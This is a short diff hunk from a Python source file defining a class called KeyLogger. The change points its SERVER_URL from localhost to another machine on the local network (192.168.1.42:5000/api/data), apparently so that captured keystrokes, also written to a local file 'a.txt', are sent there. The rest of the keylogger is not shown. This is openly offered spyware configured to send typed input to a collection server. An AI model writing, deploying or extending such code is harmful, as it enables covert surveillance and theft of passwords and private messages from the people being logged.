@@ -191,7 +191,7 @@ class KeyLogger:
             listener.join()
 
 if __name__ == "__main__":
-    SERVER_URL = "http://127.0.0.1:5000/api/data"
+    SERVER_URL = "http://192.168.1.42:5000/api/data"
     LOG_FILE = "a.txt"
 
     keylogger = KeyLogger(server_url=SERVER_URL, log_file=LOG_FILE)
